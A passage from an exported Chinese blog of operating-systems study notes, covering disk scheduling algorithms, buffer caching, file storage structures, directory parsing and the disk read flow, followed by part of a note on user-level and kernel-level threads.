<p>所以，下面我们将从<strong>最基本的调度算法</strong>讲起，而后<strong>一步步优化</strong>，最终给出一个<strong>较优的调度算法</strong>。</p>
<blockquote>
<p><strong>调度算法的选择</strong></p>
</blockquote>
<p>调度算法的目的就是为了<strong>使得访问延迟最小</strong>。下面我们介绍几个调度算法：</p>
<blockquote>
<blockquote>
<p><strong>调度算法1</strong>：<code>FCFS算法</code></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661301084334.png"></p>
<ul>
<li><strong>算法描述</strong>：<strong>最先请求的最先响应</strong>。</li>
<li><strong>算法特点</strong>：<strong>最直观最公平</strong>的调度算法</li>
<li><strong>算法缺点</strong>：磁头的<strong>来回奔袭</strong>，读写<strong>时间较长</strong></li>
</ul>
<blockquote>
<blockquote>
<p><strong>调度算法2</strong>：<code>SSTF算法</code></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661301100781.png"></p>
<ul>
<li><strong>算法描述</strong>：优先选择距离最近的请求</li>
<li><strong>算法特点</strong>：可以显著降低磁头移动的数目从而降低访问延迟</li>
<li><strong>算法缺点</strong>：可能会导致一些距离局部较远的请求一直无法被响应，从而导致饥饿问题。</li>
</ul>
<blockquote>
<blockquote>
<p><strong>调度算法3</strong>：<code>SCAN算法</code></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661301120291.png"></p>
<ul>
<li><strong>算法描述</strong>：在SSTF算法的基础上中途不回折</li>
<li><strong>算法特点</strong>：可以显著降低访问延迟,同时也可以解决饥饿问题</li>
<li><strong>算法缺点</strong>：如果从中间开始启动也可能会导致公平性问题</li>
</ul>
<blockquote>
<blockquote>
<p><strong>调度算法4</strong>：<code>C-SCAN算法即电梯算法</code></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661301134643.png"></p>
<ul>
<li><strong>算法描述</strong>：在SCAN算法的基础上直接移动到另一端</li>
<li><strong>算法特点</strong>：即兼顾了SCAN算法的优点又可以使得两端请求都可以很快处理</li>
</ul>
<blockquote>
<p>磁盘调度的<strong>补充</strong></p>
</blockquote>
<p>磁盘调度发生在<strong>磁盘中断</strong>后，即完成当前请求的读写任务后就会告知CPU，之后就会在<strong>队列中</strong>选择合适的<strong>盘块号</strong>进行下一次的读写。</p>
<p>关于这些调度算法的<strong>代码实现</strong>这里不再赘述。(之后也不会在各个部分介绍代码，而是重在概念、流程，在最后会整合磁盘管理的流程，到时会附上对应的代码）<br>在操作系统中有<strong>很多地方涉及到调度算法</strong>，比如：<code>多进程切换</code>时的调度、<code>内存换入换出</code>时的调度等，对于这些调度算法我们<strong>不需要死记硬背</strong>，而是要<strong>学会自己去推导</strong>，一般常用的推导思路：<strong>从FxFx开始，而后找出缺点，针对其进行优化等</strong>。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>前面我们介绍了操作系统对于磁盘管理的<strong>第二层抽象——多进程、多请求的处理</strong>。我们<strong>通过队列</strong>管理请求信息并使用<strong>调度算法</strong>确定请求执行顺序。<br>下面就要从<strong>数据的存储方面</strong>进行进一步优化，也就是<strong>第三层抽象</strong>——<code>磁盘请求到高速缓存</code>。</p>
</blockquote>
</blockquote>
<h2 id="第三次抽象：从磁盘请求到高速缓存"><a href="#第三次抽象：从磁盘请求到高速缓存" class="headerlink" title="第三次抽象：从磁盘请求到高速缓存"></a>第三次抽象：从磁盘请求到高速缓存</h2><blockquote>
<p>磁盘读写与高速缓存的联系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661323782154.png"></p>
<p>如图所示，<code>高速缓存</code>是位于<code>用户态buf</code>和<code>磁盘</code>之间的一个区域，其作用就是为了<strong>减少磁盘读写次数</strong>以提高读写效率。</p>
<p>因为<strong>磁盘读写</strong>是<strong>以磁盘块为单位</strong>的，根据<code>局部思想</code>，程序访问的地址往往在<strong>同一个磁盘块</strong>，所以这时就<strong>不需要重复去读写磁盘</strong>了，而是将此磁盘块内容<strong>保存在高速缓存中</strong>以便于后续使用。如果访问内容已经在高速缓存，就不需要进行<strong>后续的请求req</strong>与<strong>电梯队列</strong>了。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>通过上文的<strong>三层抽象</strong>，用户只需要通过<strong>盘块号</strong>调用<code>bread函数</code>即可完成<strong>磁盘的读写</strong>。<br>但是通过盘块号进行磁盘读写<strong>对于用户来说还是不够方便</strong>，因为用户不仅要了解<strong>磁盘块的概念、磁盘块的大小</strong>，还要记住<strong>数据存储的盘块号</strong>以便于后续访问。所以为了使得磁盘的数据访问<strong>更加符合人们习惯</strong>，引出了操作系统对于磁盘管理的进一步抽象——<code>基于文件的磁盘使用</code>。(文件抽象又可以<strong>分为两层</strong>，下面我们会依次进行介绍，<strong>由浅入深</strong>）</p>
</blockquote>
</blockquote>
<h1 id="基于文件的磁盘使用"><a href="#基于文件的磁盘使用" class="headerlink" title="基于文件的磁盘使用"></a>基于文件的磁盘使用</h1><h2 id="第四层抽象：引出文件"><a href="#第四层抽象：引出文件" class="headerlink" title="第四层抽象：引出文件"></a>第四层抽象：引出文件</h2><p>raw disk即生磁盘对于普通用户来说还是太复杂了，所以操作系统引入一个更高层次的抽象：文件 </p>
<blockquote>
<p>文件是什么样的？</p>
</blockquote>
<ul>
<li><strong>用户</strong>眼中的文件就是一个<code>字符流</code>。</li>
<li><strong>磁盘</strong>上的文件则是由一个个<code>盘块拼接</code>而成的。</li>
</ul>
<p>到这里，本小节内容就已经出来了：<strong>如何将字符流与盘块号对应起来</strong>。即建<strong>立字符流到盘块集合</strong>的<code>映射关系</code>。</p>
<blockquote>
<p>映射的<strong>作用</strong></p>
</blockquote>
<p>看下面<strong>这个例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661312415753.png" alt=" =600x300"></p>
<p>如图所示，在用户眼中这个<code>test.c</code>文件就是一个多个字符组成的<strong>字符流</strong>，可以直接在这个流中进行修改；而在<strong>最终在磁盘中</strong>，字符流的修改就要<strong>具化到一个具体的盘块</strong>，之后进行内容修改。</p>
<p><code>映射</code>就是将用户对于<strong>磁盘的使用</strong>具体到<strong>硬件的实现</strong>，即<strong>完成字符流到盘块号的转换</strong>。</p>
<blockquote>
<p>映射的<strong>建立</strong></p>
</blockquote>
<p>文件是存放在磁盘上的盘块上的，所以要建立映射关系，只需要在<code>FCB</code>中<strong>初始化一个数据结构</strong>，记录当前文件处于的起始块和块数即可。</p>
<p>所以这时用户想对<strong>文件进行操作</strong>只需要给出<code>文件名</code>和所操作区域在<code>字符流的位置</code>就可以了。</p>
<blockquote>
<p>文件存储的结构</p>
</blockquote>
<p>前面我们介绍映射关系时<strong>默认使用</strong>的<strong>文件存储结构</strong>是<code>连续结构</code>，这种方式有<strong>很多缺点</strong>。下面我们会具体介绍一些<strong>文件存储的结构</strong>并分析其优缺点。</p>
<blockquote>
<blockquote>
<p>存储结构1：<code>连续结构</code></p>
</blockquote>
</blockquote>
<p><strong>结构视图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310848557.png"></p>
<p><strong>视图介绍</strong>：创建文件时，会将对应的<strong>字符流</strong>依次存放在盘块号<strong>连续的多个磁盘块</strong>上，然后将<strong>第一个磁盘块</strong>的盘块号放到此文件的<strong>FCB中</strong>。用户需要访问此文件时，就可以通过文件的FCB取出<strong>起始块号</strong>并与<strong>pos</strong>计算得出<strong>磁盘块块号</strong>。</p>
<p><strong>映射表的建立</strong>：如图所示，只需要保存<code>文件名</code>、<code>起始块号</code>、<code>文件长度</code>即可。</p>
<p><strong>优点</strong>：<strong>访问速度</strong>很快，可以根据字符位置很快计算出磁盘块块号</p>
<p><strong>缺点</strong>：文件<strong>改写很麻烦</strong>，同时对文件进行<strong>追加内容</strong>时可能会<strong>覆盖掉其他文件</strong>。</p>
<blockquote>
<blockquote>
<p>存储结构2：<code>链式结构</code></p>
</blockquote>
</blockquote>
<p><strong>结构视图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661311357888.png"></p>
<p><strong>视图介绍</strong>：字符流的存储<strong>不需要连续</strong>，而是可以存放在不同的磁盘块中，只是每一个磁盘块中都要<strong>存储下一个磁盘块的盘块号</strong>。</p>
<p><strong>映射表的建立</strong>：如图所示，只需要保存<code>文件名</code>、<code>起始块号</code>、<code>文件长度</code>即可。</p>
<p><strong>优点</strong>：方便对文件<strong>进行修改</strong>。</p>
<p><strong>缺点</strong>：文件<strong>读的效率很低</strong>，因为涉及到<strong>跳转</strong>。</p>
<blockquote>
<blockquote>
<p>存储结构3：<code>索引结构</code></p>
</blockquote>
</blockquote>
<p><strong>结构视图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661311532592.png"></p>
<p><strong>视图介绍</strong>：对于一个文件，其<strong>字符流</strong>被分为<strong>多个逻辑块</strong>，这些逻辑块被存储在<strong>不连续的磁盘块中</strong>，也是拿出<strong>一个磁盘块</strong>作为<code>索引块</code>，用于存储该文件<strong>各个逻辑块</strong>存储的<strong>磁盘块块号</strong>。</p>
<p><strong>映射表的建立</strong>：需要存储<strong>文件名</strong>、<code>索引块号</code>、<strong>文件长度</strong></p>
<p><strong>优点</strong>：<strong>读写效率都较高</strong>。因为对于<strong>读操作</strong>，<strong>索引存储结构</strong>是顺序结构和链式结构的折中；而对于<strong>写操作</strong>，由于是存储在<strong>不连续的磁盘块</strong>，所以效率较高。</p>
<p><strong>缺点</strong>：没有考虑到<code>文件大小</code>的因素，即<strong>小文件不需要索引块</strong>、<strong>大文件一个索引块存储不了</strong>。</p>
<blockquote>
<blockquote>
<p>存储结构4：<code>多级索引结构</code>（** **）</p>
</blockquote>
</blockquote>
<p><strong>结构视图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661312025049.png"></p>
<p><strong>视图介绍</strong>：考虑到<code>文件大小</code>的因素。对于<strong>小文件</strong>可以直接使用<strong>直接数据块号</strong>；<strong>中文件</strong>使用<strong>一阶索引</strong>；<strong>大文件</strong>使用<strong>多阶间接索引</strong>。这个模式类似内存管理中介绍的<code>多级页表</code>。</p>
<p>这种存储结构就是现在<strong>实际操作系统使用</strong>的。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>通过<strong>前面4层抽象</strong>，我们已经可以通过<strong>文件</strong>完成磁盘的读写操作。<br>但是前面我们是直接告诉了<strong>文件的位置</strong>，而后获取到<code>inode</code>。在实际情况下，我们需要根据<strong>文件名</strong>在<strong>文件表</strong>里查询以找到此文件，这个过程就是第五层抽象——<code>文件系统的建立</code>。</p>
</blockquote>
</blockquote>
<h2 id="第五层抽象：将磁盘抽象为一个文件系统"><a href="#第五层抽象：将磁盘抽象为一个文件系统" class="headerlink" title="第五层抽象：将磁盘抽象为一个文件系统"></a>第五层抽象：将磁盘抽象为一个文件系统</h2><p>不论对<strong>磁盘</strong>如何抽象，最终到用户眼中就是<code>一棵目录树</code>，这个树就是一个<code>文件系统</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310317075.png"></p>
<p><code>目录树</code>即<strong>文件系统</strong>就是对<strong>磁盘块的进一步抽象</strong>，与文件抽象不同，<strong>文件抽象是指如何将一个文件映射到多个盘块</strong>，而文件系统的抽象是把<strong>所有的盘块</strong>都放到这个目录树中，从而在用户层面实现一个直观的使用界面。</p>
<blockquote>
<p>从<strong>多个文件</strong>开始：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310344905.png" alt=" =400x200"></p>
<p>从<strong>单层目录到集合划分目录</strong>，为了方面用户进行管理和使用。但是仍<strong>不能很好解决问题</strong>。</p>
<blockquote>
<p>引入<code>目录树</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310453144.png" alt=" =600x300"></p>
<p>如图所示，目录树是<code>分治思想</code>的体现，经过划分后每一个集合中的文件数会变得很少。并且这种<strong>树结构扩展性好</strong>、<strong>表示清晰</strong>。</p>
<p>同时，有了目录树就要引入一个新的概念：<code>目录</code>即<strong>文件集合</strong>。</p>
<blockquote>
<p><strong>目录</strong>的实现：</p>
</blockquote>
<p>如何通过目录定位到具体的文件是一个关键问题，即<strong>通过树根到叶子节点</strong>。</p>
<p>如下例：给出<code>/my/data/a</code>，如何得到<strong>a文件的FCB</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310506517.png" alt=" =600x300"></p>
<p>如图所示，树状目录的完整实现是通过<strong>FCB数组</strong>和<strong>数据盘块集合</strong>实现。其中FCB数组存放着磁盘中<strong>所有文件的FCB</strong>，而一个文件的FCB中又保存着这个文件<strong>逻辑地址</strong>与<strong>磁盘块</strong>的<strong>映射</strong>，换句话说，<strong>找到了FCB就可以进入磁盘获取到该文件</strong>。</p>
<p>所以进行<code>目录解析</code>的<strong>流程</strong>如下：</p>
<ol>
<li>首先获取到<code>“/”根目录</code>的FCB，这个FCB是磁盘初始化时就有的，且<strong>在FCB数组的第一个位置</strong>。</li>
<li>通过根目录的FCB中存储的<strong>物理盘号</strong>信息可以定位到<strong>具体的磁盘块</strong>进而读写其中内容，此例中我们假设其中的信息为 <code>[var,13]</code>和<code>[my,82]</code>等，其代表着 <code>var</code> 和 <code>my</code> 两个目录的FCB在<strong>FCB数组的索引号</strong>。</li>
<li>使用路径信息进行匹配，进入 <code>my</code> 的<strong>PCB</strong>，从而定位到<strong>my的磁盘块</strong>，在其中保存着<strong>my目录下文件的FCB地址</strong></li>
<li>最终根据my目录下的内容定位到<strong>a文件的FCB</strong>，从而完成<strong>目录解析</strong>。</li>
</ol>
<p>具体的<strong>解析流程</strong>如下图：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661323007751.png"></p>
<hr>
<h1 id="磁盘读写的流程总结"><a href="#磁盘读写的流程总结" class="headerlink" title="磁盘读写的流程总结"></a>磁盘读写的流程总结</h1><blockquote>
<p>经过上文<strong>5层抽象</strong>的学习，我们已经对<strong>磁盘管理</strong>有了较为<strong>清晰的认知</strong>。下面我们将对磁盘读写的内容进行<strong>全面整理</strong>：包括<code>磁盘读写的流程</code>、每一个流程<code>涉及到的代码</code>与各个代码之间的<code>调用关系</code>。通过整理，我们可以整合前文知识，<strong>更加深入</strong>的理解文件系统和磁盘管理，也可以将这部分内容与<strong>操作系统的其他模块</strong>结合起来。</p>
</blockquote>
<h2 id="磁盘读写的具体流程"><a href="#磁盘读写的具体流程" class="headerlink" title="磁盘读写的具体流程"></a>磁盘读写的具体流程</h2><blockquote>
<p>下面我们将以一个<code>open</code>的例子来介绍<strong>磁盘管理</strong>的具体流程：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661310543955.png" alt=" =600x300"></p>
<ol>
<li>操作系统在安装时会将<strong>磁盘格式化</strong>，成为如<strong>下图的结构</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661312691051.png"></li>
<li>系统在启动时会把<strong>磁盘根目录文件</strong>找到，并把其<strong>inode写入内存</strong>作为1号进程的资源</li>
<li>用户创建的进程会<strong>继承这个根目录</strong>的FCB（<code>fork()创建进程是以复制父进程实现的</code>）</li>
<li>用户<strong>启动一个进程</strong>，调用<code>open(/my/data/a)</code>打开一个文件：本质是<strong>将a文件的inode写入内存</strong>，并返回一个<strong>文件句柄fd</strong>。（会根据文件路径进行<code>目录解析</code>）</li>
<li>用户根据此句柄<strong>进行文件操作</strong>。如<code>read(fd，buf，count)</code>,会根据<strong>fd</strong>找到当前<strong>文件字符流的pos</strong>，之后根据<code>pos</code>和文件<code>inode</code>中存储的<strong>索引信息</strong>可以找到pos对应的<strong>物理盘块的盘块号</strong></li>
<li>调用<code>bread(block)</code>读磁盘<strong>高速缓存</strong>，如果内容已在则直接读到内存buf；没在就获取一个<strong>空闲的高速缓存</strong>并将block信息写到bh</li>
<li>发起磁盘<strong>读写请求req</strong>，根据<code>block</code>计算得出<strong>扇区号</strong>，并将req加入到<strong>电梯队列</strong>，而后<strong>进程睡眠</strong></li>
<li>磁盘控制器处理完毕上一个磁盘请求会产生<strong>磁盘中断</strong>，这时就很根据调度算法从电梯队列中取出这个<strong>请求req</strong>，并将<code>扇区号</code>换算为<code>CHS地址</code>，利用<code>out指令</code>将CHS发送到磁盘控制器。</li>
<li>磁盘操作完毕再次进行中断，此时a文件的字符流数据已经<strong>存放到bh高速缓存</strong>，唤醒的进程将此内容<strong>复制到buf</strong>即可完成read。</li>
</ol>
<p>最后，不论是这里的<code>磁盘管理</code>，还是第七节的<code>IO设备管理</code>，其<strong>执行流程</strong>是一致的，无非是在<strong>inode处进行分支</strong>，一个通过<strong>映射表</strong>定位到<strong>磁盘</strong>一个通过<strong>函数</strong>实现数据的显示。究其根本还是对于<strong>文件的使用</strong>，所以对于文件和文件系统理解十分重要，<code>文件视图</code>也当之无愧的成为操作系统的<strong>第二个核心视图</strong>。</p>
<p>注：关于文件系统和磁盘管理的内容还有部分未学习——磁盘读写过程中各个环节具体代码的实现。后续会继续补充。现在主要是要了解文件视图的框架和思想，可以将读写的流程说个大概。</p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第四节）操作系统--多进程之线程切换（3部分）</title>
    <url>/2022/08/13/%EF%BC%88%E7%AC%AC%E5%9B%9B%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B9%8B%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：<br>前面讲到，计算机在执行一个进程时，可能会涉及到IP操作等导致该指令无法继续执行，而是会切换到其他进程。关于<strong>多进程之间的切换</strong>是本篇文章的核心内容。</p>
<blockquote>
<p><code>进程=资源+指令执行序列</code>。其中<strong>资源对应着内存</strong>，也就是<code>映射表</code>。<br>在进行进程切换时需要对<strong>资源和指令序列</strong>同时进行切换，这个<strong>过程很复杂</strong>。所以，可以将<strong>资源和指令执行分开</strong>，即一个资源+多个指令执行序列构成一个进程，这样在切换是只需要<strong>进程pc</strong>的切换即可。<br><strong>线程：保留了并发的优点，避免了进程切换代价</strong>。</p>
</blockquote>
</blockquote>
<blockquote>
<p>所以：本篇文章内容主要是<code>以线程之间的切换也就是指令序列的切换</code>为主，这样做可以让我们<strong>摒弃资源切换</strong>的复杂步骤，更加清晰的把握多进程切换的<strong>核心要点。</strong><br>当然，<strong>资源的切换</strong>也会进行介绍，不过要放到后面<strong>内存管理</strong>部分。</p>
</blockquote>
<h1 id="线程的介绍及其价值"><a href="#线程的介绍及其价值" class="headerlink" title="线程的介绍及其价值"></a>线程的介绍及其价值</h1><h2 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程"></a>什么是线程</h2><blockquote>
<p><code>线程（英语：thread）</code>是操作系统能够进行<strong>运算调度的最小单位</strong>。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是<strong>进程中一个单一顺序的控制流</strong>，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660305630646.png"></p>
<p>如图所示，同一个进程中有多个线程，其共享资源，可以进行切换执行。</p>
<blockquote>
<p>线程与进程的对比（不同）？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660305777126.png"></p>
<p>上表详细比较了线程与进程的区别。</p>
<blockquote>
<p>如何选择使用线程还是进程呢？</p>
</blockquote>
<p>很简单，判断需要完成的任务<strong>是否需要独立的资源空间</strong>。如下面这个例子：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660306064763.png"></p>
<p>这一题的答案是<strong>C</strong>。对于需要存放账号、密码等<strong>安全性较高</strong>的任务需要<strong>开辟单独的存储空间</strong>，也就要<strong>使用进程</strong>。</p>
<h2 id="一个多线程的例子"><a href="#一个多线程的例子" class="headerlink" title="一个多线程的例子"></a>一个多线程的例子</h2><p>线程的切换不仅仅可以帮助我们理解进程切换的本质，<strong>线程本身也很有价值</strong>。</p>
<blockquote>
<p>线程本身是否有用呢？我们用<strong>一个例子</strong>来看一下。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660304292326.png"></p>
<p>一个浏览器网页需要很多线程配合实现功能：<strong>文件下载、文本显示、图片显示</strong>等功能不是顺序执行的，而是<strong>交替执行</strong>的。从而可以实现<strong>右侧示例</strong>的功能。</p>
<p>同时一个网页的多个线程可以<strong>共享资源</strong>，因为本身就是为了此网页的显示，共享资源<strong>不会导致安全问题</strong>。<br>如果将这几个<code>线程隔离</code>还可能会导致<strong>内存的浪费</strong>和<strong>代码执行效率的降低</strong>。</p>
<p>下图给出了这个<strong>多进程浏览器</strong>的<strong>代码轮廓</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660304855562.png"></p>
<h1 id="用户级线程"><a href="#用户级线程" class="headerlink" title="用户级线程"></a>用户级线程</h1><blockquote>
<p>用户级线程是指<code>由用户程序自己管理的线程</code>，该线程对操作系统<strong>透明</strong>，即操作系统完全<strong>不知道这些线程</strong>的存在。</p>
</blockquote>
<p>前面我们介绍了一个多线程浏览器的示例，其中给出了<strong>线程切换的流程</strong>。主要涉及到：<code>yeild()</code>和<code>create()</code>这两个<strong>核心函数</strong>，一个进行<strong>切换</strong>，一个进行<strong>创建</strong>。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660307628727.png"></p>
<h2 id="用户级线程的切换"><a href="#用户级线程的切换" class="headerlink" title="用户级线程的切换"></a>用户级线程的切换</h2><blockquote>
<p><code>Yield()</code>是完成线程切换的核心函数。下面我们以一个实际的例子来一步步分析这个函数的实现与其中的注意事项。</p>
</blockquote>
<blockquote>
<p>第一步：两个执行序列和一个栈</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660309876281.png"></p>
<p>如图所示，函数A和B属于线程1，函数C和D属于线程2。两个线程中的所有函数共用一个栈。</p>
<p>我们先来分析一下<strong>上述程序的执行流程</strong>：</p>
<ol>
<li>首先执行<code>函数A</code>,其中调用了<code>函数B</code>，所以先将<strong>104压栈</strong>之后<strong>跳转到B函数</strong>位置；</li>
<li>然后执行<code>B函数</code>，此函数需要调用<code>Yield()</code>进行<strong>线程切换</strong>，不过在此之前要先将<strong>204压栈</strong>，然后<strong>跳转到函数C</strong>；</li>
<li>之后执行<code>函数C</code>，其调用了<code>函数D</code>，所以先将<strong>304压栈</strong>而后<strong>跳转到函数D</strong>；</li>
<li>再之后执行<code>函数D</code>，此函数也是调用了<code>Yeild()</code>进行<strong>线程切换</strong>，所以先将<strong>404压栈</strong>，而后<strong>跳转到204</strong>位置。</li>
</ol>
<p>到这里，继续执行就会<strong>出现问题</strong>：当执行完毕204代码后需要返回，按照正常的流程来看，B函数执行完就要返回A函数了，但是<strong>这里却是返回了D函数的404位置</strong>。</p>
<p><strong>原因很简单</strong>：<code>因为两个线程共享一个栈，导致返回地址在栈中出现混乱</code>。</p>
<p><strong>解决方法</strong>：<code>不同线程使用不同的栈空间</code>。</p>
<hr>
<blockquote>
<p>第二步：从一个栈到两个栈</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660310440916.png"></p>
<p>如上图所示，线程1和2使用不同栈，并使用<code>TCB</code>这个全局的数据结构进行信息存储，类似于进程中的PCB。</p>
<p>先不要看上图中的红字，我们来<strong>分析一下函数的执行流程</strong>：</p>
<ol>
<li>前面的步骤与第一步一致，直到函数D执行Yield()进行线程切换。</li>
<li>会先进行栈的切换，而后跳转到204位置。</li>
<li>之后执行204位置代码，执行完毕后返回。</li>
</ol>
<p>又<strong>出现问题</strong>了：本来按照程序的执行流程，在执行完毕B函数后需要返回函数A。在<strong>第一步中</strong>由于栈的共享导致返回了404位置，<strong>这里</strong>使用不同栈进行处理，结果却导致<strong>再次返回204位置</strong>。</p>
<p><strong>原因很简单</strong>：<strong>在B函数调用Yield()时会先将204压栈存储，所以会导致重复执行</strong>。</p>
<p><strong>解决方法</strong>：<code>去除Yield()函数中的jmp指令，只进行栈的切换</code>。</p>
<hr>
<p>到这里，线程之间的切换也就是yield()函数也就介绍完毕了，我们<strong>做出以下总结</strong>：</p>
<ol>
<li>用户级线程的切换就是在<strong>切换位置</strong>上<code>调用Yield()</code>函数。</li>
<li><code>Yield()函数</code>完成的基本工作就是找到下一个线程的TCB，然后根据<strong>当前线程的TCB</strong>和<strong>下一个线程的TCB</strong>完成用户栈的切换。</li>
<li>在切换到新的栈后通过<code>Yield函数的“&#125;”</code>来进行PC指针的切换，而<strong>不是使用jmp</strong>进行。</li>
</ol>
<h2 id="用户级线程的建立"><a href="#用户级线程的建立" class="headerlink" title="用户级线程的建立"></a>用户级线程的建立</h2><blockquote>
<p> Creat() 实现线程的建立：栈、TCP等数据结构的创建</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660311873759.png"></p>
<p>如图所示，<code>Creat()</code>的作用：为TCB和栈<strong>申请空间并将其关联</strong>，同时在栈中压入程序的<strong>初始地址</strong>，实现第一次切换时的正确执行。</p>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660312075493.png"><br>将进程切换和建立等内容<strong>组合</strong>即可实现一个<strong>完整</strong>的浏览器页面显示功能。</p>
<h2 id="用户级线程与核心级线程的简单比较"><a href="#用户级线程与核心级线程的简单比较" class="headerlink" title="用户级线程与核心级线程的简单比较"></a>用户级线程与核心级线程的简单比较</h2><p>前面我们介绍了的用户级线程的切换和建立，主要涉及到<code>Yield()</code>和<code>Creat()</code>两个函数。<br>但是，用户态线程有一个<strong>很大的缺陷</strong>，如下图所示：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660312210681.png"></p>
<p>因为用户态线程对于操作系统来说是<strong>透明的</strong>，但是在线程功能的具体执行时最终还是要到<strong>硬件层次</strong>，也就是要<strong>进入操作系统内核</strong>。所以一旦某一个线程进入内核时<strong>发生阻塞</strong>，这时操作系统并不会切换到其他线程（<code>因为操作系统并不知道用户态线程</code>）而是会切换到其他<strong>进程</strong>，这就导致了<strong>线程并发的无效</strong>。</p>
<hr>
<p>为了解决上述问题，就要使用<code>核心级线程</code>，具体如下所示：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660312542500.png"></p>
<p>线程之间的切换不再使用Yiled()而是使用Schedule，调度点由系统决定。具体原理和实现下一步部分介绍。</p>
<h1 id="内核级线程"><a href="#内核级线程" class="headerlink" title="内核级线程"></a>内核级线程</h1><h2 id="内核级线程的引入"><a href="#内核级线程的引入" class="headerlink" title="内核级线程的引入"></a>内核级线程的引入</h2><blockquote>
<p>内核级线程的优点：适用于多核处理器结构<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660357656141.png"></p>
</blockquote>
<p>如图所示，<code>内核级线程可以支持多核处理器</code>。（多个核心，一个MMU和Cacha）<br>而<strong>多进程和用户级线程</strong>并<strong>不支持多核处理器</strong>。<strong>原因</strong>如下：</p>
<ol>
<li>进程涉及到<strong>资源的分配</strong>，每一个进程都有其<strong>独立的内存空间</strong>，而多核处理器是共享MMU的，所以不适用于多进程。</li>
